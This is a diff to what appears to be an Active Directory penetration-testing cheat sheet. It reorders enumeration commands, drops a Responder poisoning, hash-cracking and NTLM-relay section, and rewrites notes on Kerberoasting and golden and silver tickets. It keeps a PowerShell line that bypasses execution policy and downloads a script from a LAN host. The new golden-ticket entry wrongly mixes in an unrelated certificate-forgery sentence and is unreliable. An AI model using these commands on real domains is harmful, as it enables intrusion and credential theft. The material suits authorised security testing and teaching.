@@ -9,6 +9,9 @@ nltest /domain_trusts /all_trusts                 Show domain trusts
 nltest /dclist:<domain>                           Show domain controllers for a given domain
 net localgroup "administrator"                    Show users in the local administrator group
 net group "domain admins" /domain                 Show users in the domain admins Security Group
+net user /domain                                  Show all domain users
+net user <user> /domain                           Show all Security Groups a domain user belongs to
+net group /domain                                 Show all Security Groups in a domain
 
 AdFind.exe -f "(objectcategory=person)"
 AdFind.exe -f "(objectcategory=computer)"
@@ -18,11 +21,6 @@ AdFind.exe -subnets -f "(objectCategory=subnet)"
 AdFind.exe -f "(objectcategory=group)"
 AdFind.exe -gcb -sc trustdmp
 
-net user /domain                                  Show all domain users
-net user <user> /domain                           Show all Security Groups a domain user belongs to
-net group /domain                                 Show all Security Groups in a domain
-
-- Other
 dig -t SRV _gc._tcp.lab.acme.org                  Global catalog
 dig -t SRV _ldap._tcp.acme.org                    LDAP servers
 dig -t SRV _kerberos._tcp.acme.org                Kerberos KDC
@@ -33,27 +31,6 @@ nmap --script dns-srv-enum --script-args "dns-srv-enum.domain='acme.org'"
 Using Windows > cmd > powershell
 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent Domain()
 Look for PdcRoleOwner and Name
-------------------------------------------------------------------------------------------------------
-
-# Responder
-
-Use Responder to poison LLMNR/NBT-NS requests and capture NTLM/NTLNv2 hashes. This happens when you
-    try to identify a host and DNS fails.
-
-responder -I eth0 -PvA     Analyze mode, no poisoning occurs
-responder -I eth0 -wrd
-
-- Crack the hash
-hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
-
-- Relay NTLMv2 hashes if SMB Signing is disabled.
-cd /opt/CrackMapExec/cme/thirdparty/impacket/examples/
-ntlmrelayx.py
-
-- Host discovery and enumeration
-netdiscover -i eth0 -r <CIDR>
-nmap -Pn -n -T4 --open -p- -sC -sV -iL targets.txt
-    Or use Discover which combines nmap, nmap scripts and Metasploit auxiliary modules.
 ------------------------------------------------------------------------------------------------------
 
 # BloodHound
@@ -96,11 +73,8 @@ Drag and drop the zip file into the UI
 cd to a discrete, writable directory (C:\Users\<user>\Desktop)
 powershell -nop -exec bypass "IEX (New-Object Net.Webclient).DownloadFile('http://192.168.1.5:8000/ADACLScan.ps1', 'ADACLScan.ps1')"
 
-.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM"
-
-    or (default is CSV output)
-
-.\ADACLScan.ps1 -Base "OU=CORP,DC=CONTOS,DC=COM" -HTML
+.\ADACLScan.ps1 -Base "OU=CORP,DC=ACME,DC=ORG"    Default is CSV output
+.\ADACLScan.ps1 -Base "OU=CORP,DC=ACME,DC=ORG" -HTML
 
 File will be saved to something like: domain_DOMAIN_adAclOutput<date>_<time>.csv or .htm
 ------------------------------------------------------------------------------------------------------------------------------------------------------
@@ -134,21 +108,27 @@ GetDecryptedCpassword 'AES 256-bit encrypted password'
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Key terms
-Service Principal Name (SPN)
-Unique name for a service account. Used by Kerberos authentication to associate a service instance with a service logon account. This allows a clients
+
+- Kerberos
+The default authentication mechanism in Active Directory. It uses ticket-based authentication. A Key Distribution Center (KDC) grants a
+Ticket-Granting Ticket (TGT) to a user who requests access to a service or an account. This ticket can be redeemed to generate a service ticket (ST)
+to access a particular service.
+
+- Ticket Granting Server (TGS)
+
+- Service Principal Name (SPN)
+A unique name for a service account that is used by Kerberos to associate a service instance with service logon account. This allows a client
 application to request that the service authticate an account even if the client does not have the account name.
 
-Key Distribution Center (KDC)                     DC that does the authentication
-Ticket Granting Ticket (TGT)                      Used to autheenticate to the KDC
-Ticket Granting Server (TGS)                      A service ticket
+- Kerberoasting
+Request the TGS ticket, which has the password hash of the SPN account, then crack it offline.
 
-# Kerberoasting
-Request the TGS ticket, which has the password hash of the SPN's account, then crack it offline.
+- Golden ticket
+The krbtgt account’s NTLM hash is used to forge a TGT that grants unlimited access and persistence to a domain. Use Empire, Metasploit, or Mimikatz.
+Leverages the certificate-based authentication in Active Directory enabled by default with the installation of Active Directory Certificate Services
+(ADCS) by forging a new certificate using the private key of the CA certificate.
 
-# Golden ticket
-A forged TGT that grants unlimited access and persistence to the domain. Use Empire, Metasploit, or Mimikatz.
-
-# Silver ticket
+- Silver ticket
 A forged TGS ticket for a specific service. TGS tickets are encrypted with the password hash for the service. If you can get the hash for a service
 account, you can create a TGS ticket for that service.
 ------------------------------------------------------------------------------------------------------------------------------------------------------
